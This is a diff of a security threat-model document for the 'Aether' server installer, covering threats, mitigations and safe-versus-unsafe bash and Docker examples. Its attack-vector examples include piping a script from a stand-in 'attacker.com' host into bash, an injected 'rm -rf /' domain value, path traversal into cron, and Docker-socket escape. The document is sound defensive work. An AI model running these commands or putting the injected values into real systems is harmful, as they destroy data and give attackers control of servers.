@@ -8,9 +8,12 @@
 
 ## Executive Summary
 
-The Aether installer executes with elevated privileges on production servers, making it a **critical security component**. This document defines the security model, threat analysis, and mitigation strategies.
+The Aether installer executes with elevated privileges on production servers, making it a **critical
+security component**. This document defines the security model, threat analysis, and mitigation
+strategies.
 
 **Security Principles:**
+
 1. **Least Privilege** - Request only necessary permissions
 2. **Defense in Depth** - Multiple layers of security
 3. **Fail Secure** - Abort on security verification failure
@@ -70,6 +73,7 @@ The Aether installer executes with elevated privileges on production servers, ma
 **Threat:** Attacker intercepts download and replaces installer or release artifacts
 
 **Attack Vector:**
+
 ```
 User → curl http://attacker.com/install.sh | bash
       (typo or phishing)
@@ -80,6 +84,7 @@ User → curl http://attacker.com/install.sh | bash
 **Likelihood:** Medium - Requires user error or DNS hijacking
 
 **Mitigations:**
+
 1. ✅ **HTTPS Only** - All downloads over TLS
 2. ✅ **Checksum Verification** - SHA256 hash validation
 3. ⏳ **Signature Verification** - GPG signature (future)
@@ -95,6 +100,7 @@ User → curl http://attacker.com/install.sh | bash
 **Threat:** Release server is compromised, malicious code in official releases
 
 **Attack Vector:**
+
 ```
 Attacker → Compromises build server
          → Injects backdoor
@@ -107,6 +113,7 @@ Attacker → Compromises build server
 **Likelihood:** Low - Requires infrastructure breach
 
 **Mitigations:**
+
 1. ✅ **Checksum Verification** - Detect tampering
 2. ⏳ **GPG Signature** - Cryptographic proof of origin
 3. ⏳ **Reproducible Builds** - Verify build integrity
@@ -123,6 +130,7 @@ Attacker → Compromises build server
 **Threat:** Installer gains more privileges than necessary
 
 **Attack Vector:**
+
 ```
 Installer → Exploits sudo bug
           → Gains root access
@@ -134,6 +142,7 @@ Installer → Exploits sudo bug
 **Likelihood:** Low - Requires exploit
 
 **Mitigations:**
+
 1. ✅ **Minimal sudo** - Only when necessary
 2. ✅ **Explicit commands** - No wildcard sudo
 3. ✅ **User context** - Run as regular user when possible
@@ -149,6 +158,7 @@ Installer → Exploits sudo bug
 **Threat:** Attacker injects malicious commands via user input
 
 **Attack Vector:**
+
 ```
 User: --domain "example.com; rm -rf /"
 Installer: curl https://$DOMAIN  # Executes injection
@@ -159,6 +169,7 @@ Installer: curl https://$DOMAIN  # Executes injection
 **Likelihood:** Medium - Common vulnerability
 
 **Mitigations:**
+
 1. ✅ **Input Validation** - Strict regex validation
 2. ✅ **Parameterization** - Use arrays not strings
 3. ✅ **Escaping** - Quote all variables
@@ -166,6 +177,7 @@ Installer: curl https://$DOMAIN  # Executes injection
 5. ✅ **Length limits** - Prevent overflow
 
 **Example Safe Code:**
+
 ```bash
 # UNSAFE
 curl https://$DOMAIN
@@ -187,6 +199,7 @@ fi
 **Threat:** Attacker uses path traversal to write files outside install directory
 
 **Attack Vector:**
+
 ```
 User: --install-dir "/opt/../../etc/cron.d"
 Installer: Writes malicious cron job
@@ -197,12 +210,14 @@ Installer: Writes malicious cron job
 **Likelihood:** Medium - Common in installers
 
 **Mitigations:**
+
 1. ✅ **Canonicalization** - Resolve to absolute path
 2. ✅ **Path validation** - Ensure within allowed directory
 3. ✅ **Restricted directories** - Only allow specific paths
 4. ✅ **No symlinks** - Reject symlink targets
 
 **Example Safe Code:**
+
 ```bash
 # UNSAFE
 INSTALL_DIR=$1
@@ -210,22 +225,22 @@ INSTALL_DIR=$1
 # SAFE
 validate_install_dir() {
   local dir=$1
-  
+
   # Resolve to absolute path
   dir=$(realpath -m "$dir")
-  
+
   # Check it's under /opt or /home
   if [[ "$dir" != /opt/* && "$dir" != /home/* ]]; then
     error "Install directory must be under /opt or /home"
     return 1
   fi
-  
+
   # Check no traversal
   if [[ "$dir" =~ \.\. ]]; then
     error "Path traversal detected"
     return 1
   fi
-  
+
   echo "$dir"
 }
 
@@ -241,6 +256,7 @@ INSTALL_DIR=$(validate_install_dir "$USER_INPUT")
 **Threat:** Predictable secrets allow unauthorized access
 
 **Attack Vector:**
+
 ```
 Installer: PASSWORD="admin123"  # Weak default
 Attacker: Tries common passwords → Success
@@ -251,12 +267,14 @@ Attacker: Tries common passwords → Success
 **Likelihood:** High - If defaults used
 
 **Mitigations:**
+
 1. ✅ **Cryptographic RNG** - Use /dev/urandom or openssl rand
 2. ✅ **Sufficient entropy** - At least 128 bits
 3. ✅ **No defaults** - Force generation
 4. ✅ **Unique per install** - Never reuse secrets
 
 **Example Safe Code:**
+
 ```bash
 # UNSAFE
 DB_PASSWORD="changeme"
@@ -279,6 +297,7 @@ DB_PASSWORD=$(generate_password)
 **Threat:** Secrets exposed in logs, environment, or files
 
 **Attack Vector:**
+
 ```
 Installer: echo "DB_PASSWORD=$DB_PASSWORD"  # Logged
 Attacker: Reads logs → Obtains password
@@ -289,6 +308,7 @@ Attacker: Reads logs → Obtains password
 **Likelihood:** High - Common mistake
 
 **Mitigations:**
+
 1. ✅ **No echo secrets** - Never print to stdout/logs
 2. ✅ **Restricted permissions** - chmod 600 on secret files
 3. ✅ **Temporary files** - Secure temp file handling
@@ -296,6 +316,7 @@ Attacker: Reads logs → Obtains password
 5. ✅ **No environment** - Don't pass via ENV when possible
 
 **Example Safe Code:**
+
 ```bash
 # UNSAFE
 echo "Generated password: $DB_PASSWORD"
@@ -321,6 +342,7 @@ generate_secret "secrets/db_password"
 **Threat:** Database or Redis accessible from internet
 
 **Attack Vector:**
+
 ```
 Docker: ports: ["5432:5432"]  # PostgreSQL exposed
 Attacker: psql -h victim.com -U aether
@@ -331,6 +353,7 @@ Attacker: psql -h victim.com -U aether
 **Likelihood:** Medium - Misconfiguration
 
 **Mitigations:**
+
 1. ✅ **Internal networks** - Docker internal networking
 2. ✅ **No port mapping** - Don't publish internal ports
 3. ✅ **Firewall rules** - Block if accidentally exposed
@@ -338,12 +361,13 @@ Attacker: psql -h victim.com -U aether
 5. ✅ **Authentication** - Strong passwords even internally
 
 **Example Safe Config:**
+
 ```yaml
 # UNSAFE
 services:
   postgres:
     ports:
-      - "5432:5432"  # Exposed to internet!
+      - '5432:5432' # Exposed to internet!
 
 # SAFE
 services:
@@ -365,6 +389,7 @@ networks:
 **Threat:** Container has access to Docker socket, allows escape
 
 **Attack Vector:**
+
 ```
 Container: docker run -v /var/run/docker.sock:/var/run/docker.sock
          → docker run --privileged → Escape to host
@@ -375,6 +400,7 @@ Container: docker run -v /var/run/docker.sock:/var/run/docker.sock
 **Likelihood:** Low - Requires misconfiguration
 
 **Mitigations:**
+
 1. ✅ **Never mount socket** - No /var/run/docker.sock
 2. ✅ **Rootless containers** - Run as non-root
 3. ✅ **Security profiles** - AppArmor/SELinux
@@ -382,6 +408,7 @@ Container: docker run -v /var/run/docker.sock:/var/run/docker.sock
 5. ✅ **Read-only filesystem** - Where possible
 
 **Example Safe Config:**
+
 ```yaml
 # UNSAFE
 services:
@@ -393,7 +420,7 @@ services:
 services:
   backend:
     # No socket mount
-    user: "1000:1000"  # Non-root
+    user: '1000:1000' # Non-root
     read_only: true
     cap_drop:
       - ALL
@@ -410,6 +437,7 @@ services:
 **Threat:** Attacker hijacks DNS to redirect to malicious server
 
 **Attack Vector:**
+
 ```
 User: curl https://aether-os.io/install.sh
 DNS Hijack: Returns attacker IP
@@ -421,6 +449,7 @@ Attacker: Serves malicious installer
 **Likelihood:** Low - Requires DNS compromise
 
 **Mitigations:**
+
 1. ✅ **HTTPS** - TLS validates server identity
 2. ✅ **DNSSEC** - DNS authentication (future)
 3. ✅ **Checksum verification** - Detect tampering
@@ -438,21 +467,22 @@ Attacker: Serves malicious installer
 **Requirement:** All downloads MUST be verified before execution
 
 **Implementation:**
+
 ```bash
 download_and_verify() {
   local url=$1
   local output=$2
   local expected_checksum=$3
-  
+
   # Download
   if ! curl -fsSL "$url" -o "$output"; then
     error "Download failed: $url"
     return 1
   fi
-  
+
   # Verify checksum
   local actual_checksum=$(sha256sum "$output" | awk '{print $1}')
-  
+
   if [[ "$actual_checksum" != "$expected_checksum" ]]; then
     error "Checksum mismatch!"
     error "Expected: $expected_checksum"
@@ -467,13 +497,14 @@ download_and_verify() {
     rm -f "$output"
     return 1
   fi
-  
+
   success "Checksum verified: $output"
   return 0
 }
 ```
 
 **Test Cases:**
+
 - ✅ Valid download and checksum
 - ✅ Corrupted download (wrong checksum)
 - ✅ Network failure during download
@@ -486,49 +517,50 @@ download_and_verify() {
 **Requirement:** All user input MUST be validated
 
 **Implementation:**
+
 ```bash
 validate_domain() {
   local domain=$1
-  
+
   # Length check
   if [[ ${#domain} -gt 253 ]]; then
     error "Domain too long (max 253 chars)"
     return 1
   fi
-  
+
   # Format check
   if [[ ! "$domain" =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$ ]]; then
     error "Invalid domain format"
     return 1
   fi
-  
+
   # No IP addresses
   if [[ "$domain" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
     error "Use domain name, not IP address"
     return 1
   fi
-  
+
   echo "$domain"
 }
 
 validate_install_dir() {
   local dir=$1
-  
+
   # Resolve to absolute path
   dir=$(realpath -m "$dir")
-  
+
   # Must be under /opt or /home
   if [[ "$dir" != /opt/* && "$dir" != /home/* ]]; then
     error "Install directory must be under /opt or /home"
     return 1
   fi
-  
+
   # No path traversal
   if [[ "$dir" =~ \.\. ]]; then
     error "Path traversal detected"
     return 1
   fi
-  
+
   # Not system directories
   local forbidden=("/etc" "/var" "/usr" "/bin" "/sbin" "/boot" "/root")
   for f in "${forbidden[@]}"; do
@@ -537,35 +569,36 @@ validate_install_dir() {
       return 1
     fi
   done
-  
+
   echo "$dir"
 }
 
 validate_port() {
   local port=$1
-  
+
   # Must be numeric
   if [[ ! "$port" =~ ^[0-9]+$ ]]; then
     error "Port must be numeric"
     return 1
   fi
-  
+
   # Valid range
   if [[ $port -lt 1 || $port -gt 65535 ]]; then
     error "Port must be 1-65535"
     return 1
   fi
-  
+
   # Warn on privileged ports
   if [[ $port -lt 1024 ]]; then
     warning "Port $port requires root privileges"
   fi
-  
+
   echo "$port"
 }
 ```
 
 **Test Cases:**
+
 - ✅ Valid inputs
 - ✅ SQL injection attempts
 - ✅ Command injection attempts
@@ -581,10 +614,11 @@ validate_port() {
 **Requirement:** All secrets MUST be cryptographically random
 
 **Implementation:**
+
 ```bash
 generate_password() {
   local length=${1:-32}
-  
+
   # Use cryptographic RNG
   openssl rand -base64 $((length * 2)) | tr -d '\n/+=' | head -c "$length"
 }
@@ -596,7 +630,7 @@ generate_secret() {
 
 generate_hex_key() {
   local bytes=${1:-32}
-  
+
   # 32 bytes = 256 bits for AES-256
   openssl rand -hex "$bytes"
 }
@@ -610,25 +644,26 @@ store_secret() {
   local name=$1
   local value=$2
   local file="secrets/$name"
-  
+
   # Write to file
   echo "$value" > "$file"
-  
+
   # Restrict permissions
   chmod 600 "$file"
-  
+
   # Verify
   local perms=$(stat -c %a "$file")
   if [[ "$perms" != "600" ]]; then
     error "Failed to set permissions on secret file"
     return 1
   fi
-  
+
   success "Secret stored: $name"
 }
 ```
 
 **Security Properties:**
+
 - ✅ Cryptographic randomness (not pseudo-random)
 - ✅ Sufficient entropy (≥128 bits)
 - ✅ No predictable patterns
@@ -642,6 +677,7 @@ store_secret() {
 **Requirement:** Internal services MUST NOT be exposed to internet
 
 **Implementation:**
+
 ```yaml
 # docker-compose.yml
 version: '3.8'
@@ -651,8 +687,8 @@ services:
   caddy:
     image: caddy:2-alpine
     ports:
-      - "80:80"
-      - "443:443"
+      - '80:80'
+      - '443:443'
     networks:
       - public
       - internal
@@ -705,11 +741,11 @@ networks:
   # Public network (external)
   public:
     driver: bridge
-  
+
   # Internal network (isolated)
   internal:
     driver: bridge
-    internal: true  # No external access
+    internal: true # No external access
 
 secrets:
   db_password:
@@ -722,6 +758,7 @@ volumes:
 ```
 
 **Verification:**
+
 ```bash
 # Should FAIL (no external access to internal services)
 curl http://localhost:5432  # PostgreSQL
@@ -740,18 +777,19 @@ curl https://cloud.example.com/api/health
 **Requirement:** Firewall MUST block unnecessary ports
 
 **Implementation:**
+
 ```bash
 configure_firewall() {
   if ! command -v ufw > /dev/null; then
     warning "UFW not installed - skipping firewall configuration"
     return 0
   fi
-  
+
   info "Configuring firewall..."
-  
+
   # Backup existing rules
   $SUDO ufw status numbered > "backups/ufw-backup-$(date +%Y%m%d-%H%M%S).txt"
-  
+
   # Show proposed changes
   echo ""
   echo "╔════════════════════════════════════════════════╗"
@@ -767,7 +805,7 @@ configure_firewall() {
   echo "  ✗ Block Redis (6379)       - Internal only"
   echo "  ✗ Block Backend (3000)     - Internal only"
   echo ""
-  
+
   if [[ "$INTERACTIVE" == "true" ]]; then
     read -p "Apply these firewall rules? [Y/n] " -n 1 -r
     echo
@@ -776,36 +814,36 @@ configure_firewall() {
       return 0
     fi
   fi
-  
+
   # Reset to known state (optional)
   # $SUDO ufw --force reset
-  
+
   # Allow SSH (CRITICAL - prevent lockout)
   $SUDO ufw allow ssh
   success "Allowed SSH (22/tcp)"
-  
+
   # Allow HTTP and HTTPS
   $SUDO ufw allow 80/tcp
   success "Allowed HTTP (80/tcp)"
-  
+
   $SUDO ufw allow 443/tcp
   success "Allowed HTTPS (443/tcp)"
-  
+
   # Explicitly deny internal services (belt and suspenders)
   $SUDO ufw deny 5432/tcp comment "PostgreSQL - internal only"
   $SUDO ufw deny 6379/tcp comment "Redis - internal only"
   $SUDO ufw deny 3000/tcp comment "Backend API - internal only"
-  
+
   # Enable firewall
   $SUDO ufw --force enable
   success "Firewall enabled"
-  
+
   # Verify
   echo ""
   info "Current firewall status:"
   $SUDO ufw status numbered
   echo ""
-  
+
   # Test SSH still works
   if nc -z localhost 22 2>/dev/null; then
     success "SSH still accessible (lockout prevented)"
@@ -816,6 +854,7 @@ configure_firewall() {
 ```
 
 **Safety Features:**
+
 - ✅ Backup before changes
 - ✅ Show changes before applying
 - ✅ Require confirmation
@@ -830,11 +869,12 @@ configure_firewall() {
 **Requirement:** Use minimum necessary privileges
 
 **Implementation:**
+
 ```bash
 # Run as regular user when possible
 run_as_user() {
   local cmd=$1
-  
+
   if [[ "$EUID" -eq 0 ]]; then
     # Already root, run directly
     eval "$cmd"
@@ -847,7 +887,7 @@ run_as_user() {
 # Use sudo only when necessary
 run_privileged() {
   local cmd=$1
-  
+
   if [[ "$EUID" -eq 0 ]]; then
     # Already root
     eval "$cmd"
@@ -860,13 +900,13 @@ run_privileged() {
 # Example usage
 install_package() {
   local package=$1
-  
+
   # Update requires sudo
   run_privileged "apt-get update -qq"
-  
+
   # Install requires sudo
   run_privileged "apt-get install -y $package"
-  
+
   # Verify doesn't require sudo
   run_as_user "command -v $package"
 }
@@ -885,6 +925,7 @@ docker_operations() {
 ```
 
 **Privilege Escalation Points:**
+
 - ✅ Package installation (apt-get)
 - ✅ Service management (systemctl)
 - ✅ Firewall configuration (ufw)
@@ -898,6 +939,7 @@ docker_operations() {
 **Requirement:** All actions MUST be logged
 
 **Implementation:**
+
 ```bash
 # Log file
 LOG_FILE="/tmp/aether-install-$(date +%Y%m%d-%H%M%S).log"
@@ -908,7 +950,7 @@ log() {
   shift
   local message=$@
   local timestamp=$(date -Iseconds)
-  
+
   echo "[$timestamp] [$level] $message" | tee -a "$LOG_FILE"
 }
 
@@ -931,9 +973,9 @@ error() {
 # Log command execution
 log_command() {
   local cmd=$1
-  
+
   info "Executing: $cmd"
-  
+
   # Execute and capture output
   if output=$(eval "$cmd" 2>&1); then
     success "Command succeeded: $cmd"
@@ -950,9 +992,9 @@ log_command() {
 log_security_event() {
   local event=$1
   local details=$2
-  
+
   log "SECURITY" "$event: $details"
-  
+
   # Also log to syslog
   logger -t aether-installer -p auth.warning "$event: $details"
 }
@@ -963,7 +1005,7 @@ log_checksum_verification() {
   local expected=$2
   local actual=$3
   local result=$4
-  
+
   if [[ "$result" == "success" ]]; then
     log_security_event "CHECKSUM_VERIFIED" "$file"
   else
@@ -973,25 +1015,26 @@ log_checksum_verification() {
 
 log_secret_generation() {
   local secret_name=$1
-  
+
   # Never log the actual secret!
   log_security_event "SECRET_GENERATED" "$secret_name"
 }
 
 log_privilege_escalation() {
   local command=$1
-  
+
   log_security_event "PRIVILEGE_ESCALATION" "sudo $command"
 }
 
 log_network_change() {
   local change=$1
-  
+
   log_security_event "NETWORK_CHANGE" "$change"
 }
 ```
 
 **Logged Events:**
+
 - ✅ Installation start/end
 - ✅ Each stage transition
 - ✅ Download and verification
@@ -1007,11 +1050,13 @@ log_network_change() {
 ## Security Checklist
 
 ### Pre-Installation
+
 - [ ] Downloads over HTTPS only
 - [ ] Official domain verified
 - [ ] No typosquatting in URL
 
 ### During Installation
+
 - [ ] Checksum verified before extraction
 - [ ] All user input validated
 - [ ] Secrets cryptographically generated
@@ -1021,6 +1066,7 @@ log_network_change() {
 - [ ] All commands logged
 
 ### Network Configuration
+
 - [ ] Internal services not exposed
 - [ ] Firewall configured
 - [ ] SSH not blocked
@@ -1028,6 +1074,7 @@ log_network_change() {
 - [ ] HTTPS certificate valid
 
 ### Post-Installation
+
 - [ ] No default credentials
 - [ ] Docker containers running as non-root
 - [ ] No Docker socket mounted
@@ -1036,6 +1083,7 @@ log_network_change() {
 - [ ] All services healthy
 
 ### Ongoing
+
 - [ ] Audit logs preserved
 - [ ] Update mechanism secure
 - [ ] Backup encryption enabled
@@ -1050,6 +1098,7 @@ log_network_change() {
 **Symptoms:** SHA256 mismatch during download
 
 **Actions:**
+
 1. STOP installation immediately
 2. Delete downloaded file
 3. Log security event
@@ -1058,6 +1107,7 @@ log_network_change() {
 6. Contact support with details
 
 **User Message:**
+
 ```
 ╔════════════════════════════════════════════════════════╗
 ║             SECURITY ALERT                              ║
@@ -1090,6 +1140,7 @@ Log file: /tmp/aether-install-[timestamp].log
 **Symptoms:** Unusual sudo request or permission error
 
 **Actions:**
+
 1. Log security event
 2. Deny operation
 3. Alert user
@@ -1102,6 +1153,7 @@ Log file: /tmp/aether-install-[timestamp].log
 **Symptoms:** Internal service accessible from internet
 
 **Actions:**
+
 1. Stop affected service immediately
 2. Fix configuration
 3. Restart service
@@ -1172,6 +1224,7 @@ Run this scan regularly with: aether security-scan
 **Requirement:** Updates must be as secure as installation
 
 **Implementation:**
+
 ```bash
 aether update
 
@@ -1201,6 +1254,7 @@ aether update
 ## Future Enhancements
 
 ### Phase 1 (Current)
+
 - ✅ HTTPS downloads
 - ✅ SHA256 verification
 - ✅ Input validation
@@ -1208,6 +1262,7 @@ aether update
 - ✅ Network isolation
 
 ### Phase 2 (Next 3 months)
+
 - ⏳ GPG signature verification
 - ⏳ Reproducible builds
 - ⏳ SBOM (Software Bill of Materials)
@@ -1215,6 +1270,7 @@ aether update
 - ⏳ SELinux/AppArmor profiles
 
 ### Phase 3 (Next 6 months)
+
 - ⏳ Certificate pinning
 - ⏳ Attestation
 - ⏳ Supply chain provenance
